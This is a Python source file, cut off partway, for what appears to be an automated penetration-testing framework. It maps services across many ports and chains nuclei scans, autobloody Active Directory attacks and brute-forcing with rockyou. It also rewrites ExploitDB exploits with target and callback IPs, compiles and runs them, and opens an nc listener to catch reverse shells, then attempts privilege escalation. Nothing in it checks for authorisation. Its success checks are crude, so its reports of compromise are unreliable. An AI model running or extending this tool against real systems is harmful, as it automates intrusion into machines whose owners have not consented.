#!/usr/bin/env python3
"""
Enhanced Automated Exploitation System
======================================

Advanced exploitation framework with comprehensive evidence collection,
nuclei vulnerability scanning, autobloody AD exploitation, and detailed reporting.

Author: Security Framework Team
Version: 2.1.0
"""

import json
import subprocess
import argparse
import logging
import sys
import os
import time
import threading
import concurrent.futures
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any
import requests
import socket
import re
import tempfile
import shutil
import hashlib
import urllib.request
import urllib.error

# Configuration
CONFIG = {
    'nuclei_path': '/usr/bin/nuclei',
    'autobloody_path': '/home/kali/.local/bin/autobloody',
    'wordlists': {
        'dirs': 'wordlists/web-common.txt',
        'passwords': 'wordlists/kali-wordlists/rockyou.txt',
        'usernames': 'wordlists/top-usernames.txt'
    },
    'timeout': 30,
    'max_threads': 10,
    'evidence_dir': 'results/evidence',
    'reports_dir': 'results/reports',
    'exploitdb_path': '/usr/share/exploitdb',
    'reverse_shell': {
        'ip': '10.0.0.1',  # Default - will be auto-detected
        'port': 4444
    }
}

# Service definitions with comprehensive port coverage
SERVICES = {
    'http': {
        'ports': [80, 443, 8000, 8080, 8081, 8443, 8834, 3000, 5000, 9000, 8888, 9090],
        'tools': ['nuclei', 'gobuster', 'nikto', 'sqlmap', 'wpscan', 'sslscan', 'screenshot']
    },
    'ssh': {
        'ports': [22, 2222],
        'tools': ['ssh-audit', 'banner', 'bruteforce', 'config-scan']
    },
    'smb': {
        'ports': [139, 445],
        'tools': ['enum4linux', 'smbclient', 'rpcclient', 'eternal-blue', 'smb-version']
    },
    'ftp': {
        'ports': [21],
        'tools': ['anonymous', 'banner', 'bruteforce', 'version-exploits']
    },
    'telnet': {
        'ports': [23],
        'tools': ['banner', 'default-creds', 'bruteforce']
    },
    'snmp': {
        'ports': [161],
        'tools': ['community-scan', 'system-info', 'walk']
    },
    'ldap': {
        'ports': [389, 636],
        'tools': ['anonymous-bind', 'domain-enum', 'autobloody']
    },
    'mysql': {
        'ports': [3306],
        'tools': ['connect-test', 'bruteforce', 'version-scan']
    },
    'postgresql': {
        'ports': [5432],
        'tools': ['connect-test', 'bruteforce', 'version-scan']
    },
    'mssql': {
        'ports': [1433],
        'tools': ['connect-test', 'bruteforce', 'version-scan']
    },
    'nfs': {
        'ports': [2049],
        'tools': ['showmount', 'mount-test']
    },
    'rdp': {
        'ports': [3389],
        'tools': ['bluekeep', 'config-scan']
    },
    'dns': {
        'ports': [53],
        'tools': ['zone-transfer', 'enum']
    },
    'smtp': {
        'ports': [25, 465, 587],
        'tools': ['banner', 'enum', 'relay-test']
    },
    'pop3': {
        'ports': [110, 995],
        'tools': ['banner', 'bruteforce']
    },
    'imap': {
        'ports': [143, 993],
        'tools': ['banner', 'bruteforce']
    },
    'vnc': {
        'ports': [5900, 5901],
        'tools': ['auth-scan', 'bruteforce']
    }
}


class EvidenceCollector:
    """Manages evidence collection and storage"""
    
    def __init__(self, target_ip: str, evidence_dir: str = None):
        self.target_ip = target_ip
        self.evidence_dir = evidence_dir or CONFIG['evidence_dir']
        self.evidence_path = Path(self.evidence_dir) / target_ip
        self.evidence_path.mkdir(parents=True, exist_ok=True)
        self.logger = logging.getLogger(f'evidence.{target_ip}')
        
    def collect_evidence(self, test_name: str, tool: str, command: str, 
                        output: str, success: bool, metadata: Dict = None) -> str:
        """Collect and store evidence from exploitation attempts"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        evidence_data = {
            'timestamp': timestamp,
            'test_name': test_name,
            'tool': tool,
            'command': command,
            'success': success,
            'output': output,
            'metadata': metadata or {},
            'target': self.target_ip
        }
        
        filename = f"{test_name}_{tool}_{timestamp}.json"
        filepath = self.evidence_path / filename
        
        try:
            with open(filepath, 'w') as f:
                json.dump(evidence_data, f, indent=2, default=str)
            self.logger.info(f"Evidence collected: {filename}")
            return str(filepath)
        except Exception as e:
            self.logger.error(f"Failed to collect evidence: {e}")
            return ""


class ExploitExecutor:
    """Advanced ExploitDB exploit analyzer and executor"""
    
    def __init__(self, evidence_collector: 'EvidenceCollector', target_ip: str):
        self.evidence = evidence_collector
        self.target_ip = target_ip
        self.exploitdb_path = Path(CONFIG['exploitdb_path'])
        self.logger = logging.getLogger('exploit_executor')
        self.reverse_ip = self._detect_local_ip()
        self.reverse_port = CONFIG['reverse_shell']['port']
        
        # Common patterns for exploit modification
        self.modification_patterns = {
            'ip_patterns': [
                r'(\b(?:RHOST|TARGET|HOST|IP)\s*=\s*["\']?)([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})(["\']?)',
                r'(\b(?:target|host|ip)\s*=\s*["\']?)([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})(["\']?)',
                r'(connect\s*\(\s*["\']?)([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})(["\']?\s*,)',
                r'(socket\.connect\s*\(\s*\(\s*["\']?)([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})(["\']?\s*,)'
            ],
            'port_patterns': [
                r'(\b(?:RPORT|PORT|LPORT)\s*=\s*)(\d+)',
                r'(\b(?:port)\s*=\s*)(\d+)',
                r'(connect\s*\([^,]+,\s*)(\d+)(\s*\))',
                r'(socket\.connect\s*\(\s*\([^,]+,\s*)(\d+)(\s*\)\s*\))'
            ],
            'reverse_shell_patterns': [
                r'(\b(?:LHOST|CALLBACK|REVERSE_IP)\s*=\s*["\']?)([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})(["\']?)',
                r'(\b(?:lhost|callback_ip)\s*=\s*["\']?)([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})(["\']?)'
            ]
        }
    
    def _detect_local_ip(self) -> str:
        """Detect local IP for reverse shells"""
        try:
            # Try to detect the IP that can reach the target
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect((self.target_ip, 80))
            local_ip = sock.getsockname()[0]
            sock.close()
            return local_ip
        except:
            # Fallback to default interface
            try:
                result = subprocess.run(['ip', 'route', 'get', '8.8.8.8'], 
                                      capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'src' in line:
                        return line.split('src')[1].strip().split()[0]
            except:
                pass
            return CONFIG['reverse_shell']['ip']
    
    def analyze_exploit(self, exploit_path: str) -> Dict:
        """Analyze exploit to determine modification requirements"""
        try:
            full_path = self.exploitdb_path / exploit_path
            if not full_path.exists():
                return {'error': f'Exploit not found: {exploit_path}'}
            
            with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            analysis = {
                'path': exploit_path,
                'full_path': str(full_path),
                'language': self._detect_language(exploit_path, content),
                'requires_modification': False,
                'modifications_needed': [],
                'execution_method': None,
                'risk_level': 'medium',
                'parameters_found': {},
                'reverse_shell_capable': False
            }
            
            # Analyze content for modification requirements
            analysis.update(self._analyze_content(content))
            
            # Determine execution method
            analysis['execution_method'] = self._determine_execution_method(analysis)
            
            # Assess risk level
            analysis['risk_level'] = self._assess_risk_level(content, analysis)
            
            return analysis
            
        except Exception as e:
            self.logger.error(f"Failed to analyze exploit {exploit_path}: {e}")
            return {'error': str(e)}
    
    def _detect_language(self, path: str, content: str) -> str:
        """Detect exploit programming language"""
        ext = Path(path).suffix.lower()
        
        if ext in ['.py']:
            return 'python'
        elif ext in ['.pl']:
            return 'perl'
        elif ext in ['.rb']:
            return 'ruby'
        elif ext in ['.sh']:
            return 'bash'
        elif ext in ['.c']:
            return 'c'
        elif ext in ['.cpp', '.cc']:
            return 'cpp'
        elif ext in ['.java']:
            return 'java'
        elif ext in ['.php']:
            return 'php'
        elif ext in ['.js']:
            return 'javascript'
        
        # Detect by content
        if content.startswith('#!/usr/bin/python') or 'import ' in content[:200]:
            return 'python'
        elif content.startswith('#!/usr/bin/perl') or content.startswith('#!/bin/perl'):
            return 'perl'
        elif content.startswith('#!/bin/bash') or content.startswith('#!/bin/sh'):
            return 'bash'
        elif '#include <' in content[:200]:
            return 'c'
        elif '<?php' in content[:50]:
            return 'php'
        
        return 'unknown'
    
    def _analyze_content(self, content: str) -> Dict:
        """Analyze exploit content for modification requirements"""
        analysis = {
            'requires_modification': False,
            'modifications_needed': [],
            'parameters_found': {},
            'reverse_shell_capable': False
        }
        
        # Check for hardcoded IPs that need modification
        for pattern in self.modification_patterns['ip_patterns']:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                analysis['requires_modification'] = True
                analysis['modifications_needed'].append('target_ip')
                for match in matches:
                    analysis['parameters_found'][f'target_ip_{len(analysis["parameters_found"])}'] = match[1]
        
        # Check for hardcoded ports
        for pattern in self.modification_patterns['port_patterns']:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                analysis['requires_modification'] = True
                analysis['modifications_needed'].append('target_port')
                for match in matches:
                    analysis['parameters_found'][f'target_port_{len(analysis["parameters_found"])}'] = match[1]
        
        # Check for reverse shell capabilities
        for pattern in self.modification_patterns['reverse_shell_patterns']:
            if re.search(pattern, content, re.IGNORECASE):
                analysis['reverse_shell_capable'] = True
                analysis['requires_modification'] = True
                analysis['modifications_needed'].append('reverse_shell')
                break
        
        # Check for other indicators
        reverse_indicators = ['reverse', 'callback', 'shell', 'connect back', 'nc -e', 'netcat']
        for indicator in reverse_indicators:
            if indicator.lower() in content.lower():
                analysis['reverse_shell_capable'] = True
                break
        
        # Check for common parameters that need modification
        param_patterns = {
            'username': r'(\b(?:USER|USERNAME|LOGIN)\s*=\s*["\']?)([^"\'\\s]+)(["\']?)',
            'password': r'(\b(?:PASS|PASSWORD|PWD)\s*=\s*["\']?)([^"\'\\s]+)(["\']?)',
            'payload': r'(\b(?:PAYLOAD|SHELLCODE)\s*=\s*["\']?)([^"\']+)(["\']?)'
        }
        
        for param_name, pattern in param_patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                analysis['requires_modification'] = True
                analysis['modifications_needed'].append(param_name)
                for i, match in enumerate(matches):
                    analysis['parameters_found'][f'{param_name}_{i}'] = match[1]
        
        return analysis
    
    def _determine_execution_method(self, analysis: Dict) -> str:
        """Determine how to execute the exploit"""
        language = analysis['language']
        
        if language == 'python':
            return 'python3'
        elif language == 'perl':
            return 'perl'
        elif language == 'ruby':
            return 'ruby'
        elif language == 'bash':
            return 'bash'
        elif language == 'php':
            return 'php'
        elif language == 'javascript':
            return 'node'
        elif language in ['c', 'cpp']:
            return 'compile_and_run'
        elif language == 'java':
            return 'java'
        else:
            return 'unknown'
    
    def _assess_risk_level(self, content: str, analysis: Dict) -> str:
        """Assess the risk level of executing the exploit"""
        high_risk_indicators = [
            'rm -rf', 'format', 'delete', 'destroy', 'wipe',
            'system(', 'exec(', 'eval(', 'shell_exec',
            'file_get_contents', 'file_put_contents',
            'fopen', 'fwrite', 'unlink'
        ]
        
        medium_risk_indicators = [
            'connect', 'socket', 'bind', 'listen',
            'reverse', 'shell', 'cmd', 'command'
        ]
        
        content_lower = content.lower()
        
        for indicator in high_risk_indicators:
            if indicator in content_lower:
                return 'high'
        
        for indicator in medium_risk_indicators:
            if indicator in content_lower:
                return 'medium'
        
        return 'low'
    
    def modify_exploit(self, exploit_path: str, analysis: Dict, target_port: int = None) -> str:
        """Modify exploit with target-specific parameters"""
        try:
            with open(analysis['full_path'], 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            modified_content = content
            modifications_made = []
            
            # Modify target IP
            if 'target_ip' in analysis['modifications_needed']:
                for pattern in self.modification_patterns['ip_patterns']:
                    if re.search(pattern, modified_content, re.IGNORECASE):
                        modified_content = re.sub(
                            pattern, 
                            rf'\g<1>{self.target_ip}\g<3>', 
                            modified_content, 
                            flags=re.IGNORECASE
                        )
                        modifications_made.append(f'target_ip -> {self.target_ip}')
            
            # Modify target port
            if 'target_port' in analysis['modifications_needed'] and target_port:
                for pattern in self.modification_patterns['port_patterns']:
                    if re.search(pattern, modified_content, re.IGNORECASE):
                        modified_content = re.sub(
                            pattern, 
                            rf'\g<1>{target_port}', 
                            modified_content, 
                            flags=re.IGNORECASE
                        )
                        modifications_made.append(f'target_port -> {target_port}')
            
            # Modify reverse shell parameters
            if 'reverse_shell' in analysis['modifications_needed']:
                for pattern in self.modification_patterns['reverse_shell_patterns']:
                    if re.search(pattern, modified_content, re.IGNORECASE):
                        modified_content = re.sub(
                            pattern, 
                            rf'\g<1>{self.reverse_ip}\g<3>', 
                            modified_content, 
                            flags=re.IGNORECASE
                        )
                        modifications_made.append(f'reverse_ip -> {self.reverse_ip}')
            
            # Create modified exploit file
            temp_dir = Path(tempfile.mkdtemp(prefix='exploit_'))
            original_name = Path(analysis['full_path']).name
            modified_path = temp_dir / f"modified_{original_name}"
            
            with open(modified_path, 'w', encoding='utf-8') as f:
                f.write(modified_content)
            
            # Make executable if needed
            if analysis['language'] in ['bash', 'perl', 'python']:
                os.chmod(modified_path, 0o755)
            
            self.logger.info(f"Modified exploit saved to: {modified_path}")
            self.logger.info(f"Modifications made: {modifications_made}")
            
            return str(modified_path)
            
        except Exception as e:
            self.logger.error(f"Failed to modify exploit: {e}")
            return ""
    
    def execute_exploit(self, exploit_path: str, analysis: Dict, target_port: int = None, 
                       timeout: int = 30) -> Dict:
        """Execute exploit with safety measures"""
        try:
            # Modify exploit if needed
            if analysis['requires_modification']:
                modified_path = self.modify_exploit(exploit_path, analysis, target_port)
                if not modified_path:
                    return {'success': False, 'error': 'Failed to modify exploit'}
                execution_path = modified_path
            else:
                execution_path = analysis['full_path']
            
            # Prepare execution command
            cmd = self._prepare_execution_command(execution_path, analysis, target_port)
            if not cmd:
                return {'success': False, 'error': 'Cannot determine execution method'}
            
            self.logger.info(f"Executing exploit: {' '.join(cmd)}")
            
            # Set up reverse shell listener if needed
            listener_process = None
            if analysis['reverse_shell_capable']:
                listener_process = self._setup_reverse_shell_listener()
            
            # Execute exploit
            start_time = time.time()
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                cwd=Path(execution_path).parent
            )
            execution_time = time.time() - start_time
            
            # Check for success indicators
            success = self._check_exploit_success(result, analysis, listener_process)
            
            # Clean up
            if listener_process:
                try:
                    listener_process.terminate()
                    listener_process.wait(timeout=5)
                except:
                    listener_process.kill()
            
            # Clean up temporary files
            if analysis['requires_modification'] and Path(execution_path).parent.name.startswith('exploit_'):
                shutil.rmtree(Path(execution_path).parent, ignore_errors=True)
            
            # Collect evidence
            self.evidence.collect_evidence(
                'exploit_execution',
                'exploitdb',
                ' '.join(cmd),
                result.stdout + '\n' + result.stderr,
                success,
                {
                    'exploit_path': exploit_path,
                    'target_port': target_port,
                    'execution_time': execution_time,
                    'return_code': result.returncode,
                    'modifications_made': analysis['requires_modification'],
                    'reverse_shell_capable': analysis['reverse_shell_capable'],
                    'risk_level': analysis['risk_level']
                }
            )
            
            return {
                'success': success,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode,
                'execution_time': execution_time,
                'exploit_path': exploit_path,
                'modifications_made': analysis['requires_modification']
            }
            
        except subprocess.TimeoutExpired:
            self.logger.warning(f"Exploit execution timeout: {exploit_path}")
            return {'success': False, 'error': 'timeout', 'exploit_path': exploit_path}
        except Exception as e:
            self.logger.error(f"Exploit execution failed: {e}")
            return {'success': False, 'error': str(e), 'exploit_path': exploit_path}
    
    def _prepare_execution_command(self, execution_path: str, analysis: Dict, 
                                 target_port: int = None) -> List[str]:
        """Prepare command to execute exploit"""
        method = analysis['execution_method']
        
        if method == 'python3':
            return ['python3', execution_path]
        elif method == 'perl':
            return ['perl', execution_path]
        elif method == 'ruby':
            return ['ruby', execution_path]
        elif method == 'bash':
            return ['bash', execution_path]
        elif method == 'php':
            return ['php', execution_path]
        elif method == 'node':
            return ['node', execution_path]
        elif method == 'compile_and_run':
            # Compile C/C++ exploits
            executable_path = str(Path(execution_path).with_suffix(''))
            compile_cmd = ['gcc', '-o', executable_path, execution_path]
            try:
                subprocess.run(compile_cmd, check=True, capture_output=True)
                return [executable_path]
            except subprocess.CalledProcessError:
                return []
        elif method == 'java':
            # Compile and run Java
            try:
                class_name = Path(execution_path).stem
                compile_cmd = ['javac', execution_path]
                subprocess.run(compile_cmd, check=True, capture_output=True)
                return ['java', class_name]
            except subprocess.CalledProcessError:
                return []
        
        return []
    
    def _setup_reverse_shell_listener(self) -> subprocess.Popen:
        """Set up netcat listener for reverse shells"""
        try:
            cmd = ['nc', '-lvp', str(self.reverse_port)]
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            self.logger.info(f"Started reverse shell listener on port {self.reverse_port}")
            return process
        except Exception as e:
            self.logger.error(f"Failed to start reverse shell listener: {e}")
            return None
    
    def _check_exploit_success(self, result: subprocess.CompletedProcess, 
                             analysis: Dict, listener_process: subprocess.Popen = None) -> bool:
        """Check if exploit execution was successful"""
        # Check return code
        if result.returncode == 0:
            return True
        
        # Check for success indicators in output
        success_indicators = [
            'exploit successful', 'shell spawned', 'connection established',
            'payload executed', 'vulnerability confirmed', 'access granted'
        ]
        
        output = (result.stdout + result.stderr).lower()
        for indicator in success_indicators:
            if indicator in output:
                return True
        
        # Check reverse shell listener
        if listener_process and analysis['reverse_shell_capable']:
            try:
                # Give it a moment to establish connection
                time.sleep(2)
                if listener_process.poll() is None:
                    # Process still running, might have connection
                    return True
            except:
                pass
        
        # Check for specific exploit patterns
        if 'error' not in output and 'failed' not in output and len(result.stdout) > 50:
            return True
        
        return False
    
    def execute_exploitdb_results(self, exploitdb_results: List[Dict], 
                                 target_port: int = None) -> Dict:
        """Execute multiple ExploitDB exploits and return results"""
        results = {
            'total_exploits': len(exploitdb_results),
            'executed': 0,
            'successful': 0,
            'failed': 0,
            'skipped': 0,
            'executions': []
        }
        
        for exploit in exploitdb_results:
            try:
                exploit_path = exploit.get('path', '')
                if not exploit_path:
                    results['skipped'] += 1
                    continue
                
                self.logger.info(f"Analyzing exploit: {exploit_path}")
                
                # Analyze exploit
                analysis = self.analyze_exploit(exploit_path)
                if 'error' in analysis:
                    self.logger.warning(f"Skipping exploit due to analysis error: {analysis['error']}")
                    results['skipped'] += 1
                    continue
                
                # Skip high-risk exploits unless in aggressive mode
                if analysis['risk_level'] == 'high':
                    self.logger.warning(f"Skipping high-risk exploit: {exploit_path}")
                    results['skipped'] += 1
                    continue
                
                # Execute exploit
                execution_result = self.execute_exploit(exploit_path, analysis, target_port)
                results['executed'] += 1
                
                if execution_result['success']:
                    results['successful'] += 1
                    self.logger.info(f"Exploit successful: {exploit_path}")
                else:
                    results['failed'] += 1
                    self.logger.warning(f"Exploit failed: {exploit_path}")
                
                # Add to results
                execution_result.update({
                    'exploit_id': exploit.get('id', ''),
                    'exploit_description': exploit.get('desc', ''),
                    'analysis': analysis
                })
                results['executions'].append(execution_result)
                
                # Limit number of exploits to prevent system overload
                if results['executed'] >= 10:  # Configurable limit
                    self.logger.info("Reached exploit execution limit")
                    break
                
            except Exception as e:
                self.logger.error(f"Error processing exploit {exploit.get('path', 'unknown')}: {e}")
                results['failed'] += 1
        
        return results

class NucleiScanner:
    """Nuclei vulnerability scanner integration"""
    
    def __init__(self, evidence_collector: EvidenceCollector):
        self.evidence = evidence_collector
        self.nuclei_path = CONFIG['nuclei_path']
        self.logger = logging.getLogger('nuclei')
        
    def scan_target(self, target: str, port: int = None, intensity: str = 'medium') -> Dict:
        """Run nuclei scan with evidence collection"""
        try:
            # Prepare target URL
            if port:
                if port in [443, 8443]:
                    url = f"https://{target}:{port}"
                else:
                    url = f"http://{target}:{port}"
            else:
                url = target
                
            # Configure severity based on intensity
            severity_map = {
                'low': ['critical', 'high'],
                'medium': ['critical', 'high', 'medium'],
                'high': ['critical', 'high', 'medium', 'low'],
                'aggressive': ['critical', 'high', 'medium', 'low', 'info']
            }
            
            severities = severity_map.get(intensity, ['critical', 'high', 'medium'])
            
            # Build nuclei command
            cmd = [
                self.nuclei_path,
                '-u', url,
                '-severity', ','.join(severities),
                '-jsonl',
                '-silent',
                '-timeout', '10',
                '-retries', '2'
            ]
            
            # Add rate limiting for non-aggressive scans
            if intensity != 'aggressive':
                cmd.extend(['-rate-limit', '50'])
            
            self.logger.info(f"Running nuclei scan on {url}")
            
            result = subprocess.run(
                cmd, 
                capture_output=True, 
                text=True, 
                timeout=CONFIG['timeout'] * 4
            )
            
            vulnerabilities = []
            if result.stdout:
                for line in result.stdout.strip().split('\n'):
                    if line:
                        try:
                            vuln = json.loads(line)
                            vulnerabilities.append(vuln)
                        except json.JSONDecodeError:
                            continue
            
            success = len(vulnerabilities) > 0
            
            # Collect evidence
            self.evidence.collect_evidence(
                'nuclei_scan',
                'nuclei',
                ' '.join(cmd),
                result.stdout,
                success,
                {
                    'vulnerabilities_found': len(vulnerabilities),
                    'target_url': url,
                    'severity_levels': severities,
                    'intensity': intensity
                }
            )
            
            return {
                'success': success,
                'vulnerabilities': vulnerabilities,
                'url': url,
                'total_found': len(vulnerabilities)
            }
            
        except subprocess.TimeoutExpired:
            self.logger.warning(f"Nuclei scan timeout for {target}")
            return {'success': False, 'vulnerabilities': [], 'error': 'timeout'}
        except Exception as e:
            self.logger.error(f"Nuclei scan failed: {e}")
            return {'success': False, 'vulnerabilities': [], 'error': str(e)}

class AutobloodyIntegration:
    """Autobloody Active Directory exploitation integration"""
    
    def __init__(self, evidence_collector: EvidenceCollector):
        self.evidence = evidence_collector
        self.autobloody_path = CONFIG['autobloody_path']
        self.logger = logging.getLogger('autobloody')
        
    def detect_domain_controller(self, target: str) -> Dict:
        """Detect if target is a domain controller"""
        try:
            # Check for common DC ports
            dc_ports = [88, 389, 636, 3268, 3269]
            open_ports = []
            
            for port in dc_ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                result = sock.connect_ex((target, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            
            is_dc = len(open_ports) >= 2
            
            # Collect evidence
            self.evidence.collect_evidence(
                'dc_detection',
                'port_scan',
                f"DC port scan on {target}",
                f"Open DC ports: {open_ports}",
                is_dc,
                {
                    'open_dc_ports': open_ports,
                    'is_domain_controller': is_dc,
                    'checked_ports': dc_ports
                }
            )
            
            return {
                'is_domain_controller': is_dc,
                'open_ports': open_ports,
                'confidence': len(open_ports) / len(dc_ports)
            }
            
        except Exception as e:
            self.logger.error(f"DC detection failed: {e}")
            return {'is_domain_controller': False, 'error': str(e)}
    
    def run_autobloody(self, target: str, domain: str = None, user: str = None, 
                      password: str = None) -> Dict:
        """Run autobloody exploitation"""
        try:
            # Basic autobloody command for enumeration
            cmd = [
                self.autobloody_path,
                '--host', target
            ]
            
            if domain:
                cmd.extend(['--domain', domain])
            if user and password:
                cmd.extend(['--username', user, '--password', password])
            else:
                # Try anonymous/guest access
                cmd.extend(['--username', 'guest', '--password', ''])
            
            # Add enumeration modules
            cmd.extend([
                '--bloodhound',
                '--rid-brute',
                '--users',
                '--groups'
            ])
            
            self.logger.info(f"Running autobloody against {target}")
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=CONFIG['timeout'] * 3
            )
            
            success = result.returncode == 0 and len(result.stdout) > 100
            
            # Collect evidence
            self.evidence.collect_evidence(
                'autobloody_scan',
                'autobloody',
                ' '.join(cmd),
                result.stdout,
                success,
                {
                    'domain': domain,
                    'target': target,
                    'authentication': 'credentials' if user else 'anonymous'
                }
            )
            
            return {
                'success': success,
                'output': result.stdout,
                'error': result.stderr if result.stderr else None,
                'domain': domain
            }
            
        except subprocess.TimeoutExpired:
            self.logger.warning(f"Autobloody timeout for {target}")
            return {'success': False, 'error': 'timeout'}
        except Exception as e:
            self.logger.error(f"Autobloody failed: {e}")
            return {'success': False, 'error': str(e)}

class ServiceExploiter:
    """Enhanced service-specific exploitation with ExploitDB integration"""
    
    def __init__(self, evidence_collector: EvidenceCollector, target_ip: str):
        self.evidence = evidence_collector
        self.target_ip = target_ip
        self.logger = logging.getLogger(__name__)
        
        # Cache for SMB enumeration to avoid duplicate enum4linux runs
        self._smb_enumeration_cache = {}
        
        # Initialize exploit executor for advanced exploits
        self.exploit_executor = ExploitExecutor(evidence_collector, target_ip)
        
        # Enhanced service mapping with more comprehensive coverage
        self.service_methods = {
            'ftp': self._exploit_ftp,
            'ssh': self._exploit_ssh,
            'telnet': self._exploit_telnet,
            'smtp': self._exploit_smtp,
            'dns': self._exploit_dns,
            'http': self._exploit_http,
            'https': self._exploit_https,
            'pop3': self._exploit_pop3,
            'imap': self._exploit_imap,
            'snmp': self._exploit_snmp,
            'ldap': self._exploit_ldap,
            'smb': self._exploit_smb,
            'netbios-ssn': self._exploit_smb,  # NetBIOS over TCP
            'microsoft-ds': self._exploit_smb,  # Microsoft Directory Services
            'msrpc': self._exploit_msrpc,
            'mysql': self._exploit_mysql,
            'postgresql': self._exploit_postgresql,
            'mssql': self._exploit_mssql,
            'oracle': self._exploit_oracle,
            'vnc': self._exploit_vnc,
            'rdp': self._exploit_rdp,
            'winrm': self._exploit_winrm,
            'wmi': self._exploit_wmi,
            'nfs': self._exploit_nfs,
            'rpcbind': self._exploit_rpc,
            'portmapper': self._exploit_rpc,
            'kerberos': self._exploit_kerberos,
            'ldaps': self._exploit_ldap,
            'imaps': self._exploit_imap,
            'pop3s': self._exploit_pop3,
            'smtps': self._exploit_smtp,
            'ftps': self._exploit_ftp,
            'tftp': self._exploit_tftp,
            'dhcp': self._exploit_dhcp,
            'ntp': self._exploit_ntp,
            'syslog': self._exploit_syslog,
            'rsync': self._exploit_rsync,
            'mongodb': self._exploit_mongodb,
            'redis': self._exploit_redis,
            'elasticsearch': self._exploit_elasticsearch,
            'cassandra': self._exploit_cassandra,
            'memcached': self._exploit_memcached,
            'docker': self._exploit_docker,
            'kubernetes': self._exploit_kubernetes,
            'jenkins': self._exploit_jenkins,
            'tomcat': self._exploit_tomcat,
            'jboss': self._exploit_jboss,
            'weblogic': self._exploit_weblogic,
            'websphere': self._exploit_websphere,
            'iis': self._exploit_iis,
            'apache': self._exploit_apache,
            'nginx': self._exploit_nginx,
            'lighttpd': self._exploit_lighttpd,
            'ssl': self._exploit_ssl,
            'tls': self._exploit_ssl,
            'unknown': self._exploit_unknown
        }
    
    def exploit_service(self, service_name: str, port: int, service_info: Dict = None, 
                       exploitdb_results: List[Dict] = None) -> Dict:
        """
        Enhanced service exploitation with ExploitDB integration
        
        Args:
            service_name: Name of the service
            port: Port number
            service_info: Additional service information
            exploitdb_results: List of ExploitDB exploits for this service
        """
        results = {
            'service': service_name,
            'port': port,
            'target': self.target_ip,
            'timestamp': datetime.now().isoformat(),
            'generic_tools_results': {},
            'exploitdb_results': {},
            'total_attempts': 0,
            'successful_attempts': 0,
            'vulnerabilities_found': [],
            'access_gained': False,
            'credentials_found': [],
            'shells_obtained': [],
            'persistence_established': False
        }
        
        self.logger.info(f"Starting comprehensive exploitation of {service_name} on port {port}")
        
        # 1. Execute generic tools for the service
        generic_results = self._execute_generic_tools(service_name, port, service_info)
        results['generic_tools_results'] = generic_results
        results['total_attempts'] += generic_results.get('total_attempts', 0)
        results['successful_attempts'] += generic_results.get('successful_attempts', 0)
        
        # 2. Execute ExploitDB exploits if available
        if exploitdb_results:
            self.logger.info(f"Executing {len(exploitdb_results)} ExploitDB exploits for {service_name}")
            exploitdb_execution_results = self.exploit_executor.execute_exploitdb_results(
                exploitdb_results, port
            )
            results['exploitdb_results'] = exploitdb_execution_results
            results['total_attempts'] += exploitdb_execution_results['executed']
            results['successful_attempts'] += exploitdb_execution_results['successful']
            
            # Process successful exploits
            for execution in exploitdb_execution_results['executions']:
                if execution['success']:
                    results['vulnerabilities_found'].append({
                        'type': 'exploitdb_exploit',
                        'exploit_id': execution.get('exploit_id', ''),
                        'description': execution.get('exploit_description', ''),
                        'severity': 'high',
                        'confirmed': True
                    })
                    
                    # Check for access indicators
                    if self._check_access_gained(execution):
                        results['access_gained'] = True
                        if execution.get('analysis', {}).get('reverse_shell_capable'):
                            results['shells_obtained'].append({
                                'type': 'reverse_shell',
                                'exploit': execution['exploit_path'],
                                'port': self.exploit_executor.reverse_port
                            })
        
        # 3. Aggregate results
        self._aggregate_results(results, generic_results)
        
        # 4. Attempt privilege escalation if access was gained
        if results['access_gained']:
            privesc_results = self._attempt_privilege_escalation(port)
            results['privilege_escalation'] = privesc_results
            if privesc_results.get('success'):
                results['persistence_established'] = True
        
        self.logger.info(f"Exploitation complete for {service_name}:{port} - "
                        f"{results['successful_attempts']}/{results['total_attempts']} successful")
        
        return results
    
    def _execute_generic_tools(self, service_name: str, port: int, service_info: Dict = None) -> Dict:
        """Execute generic tools for the service"""
        # Get the appropriate method for this service
        method = self.service_methods.get(service_name.lower(), self._exploit_unknown)
        
        try:
            return method(port, service_info or {})
        except Exception as e:
            self.logger.error(f"Generic tool execution failed for {service_name}:{port}: {e}")
            return {
                'error': str(e),
                'total_attempts': 0,
                'successful_attempts': 0,
                'vulnerabilities': []
            }
    
    def _check_access_gained(self, execution_result: Dict) -> bool:
        """Check if exploit execution resulted in system access"""
        if not execution_result.get('success'):
            return False
        
        # Check output for access indicators
        output = (execution_result.get('stdout', '') + execution_result.get('stderr', '')).lower()
        
        access_indicators = [
            'shell spawned', 'connection established', 'access granted',
            'login successful', 'authentication successful', 'privilege escalated',
            'root@', 'administrator@', 'system@', 'nt authority\\system',
            'uid=0', 'gid=0', 'whoami', 'id', 'pwd'
        ]
        
        for indicator in access_indicators:
            if indicator in output:
                return True
        
        return False
    
    def _aggregate_results(self, results: Dict, generic_results: Dict):
        """Aggregate results from different exploitation methods"""
        # Merge vulnerabilities
        if 'vulnerabilities' in generic_results:
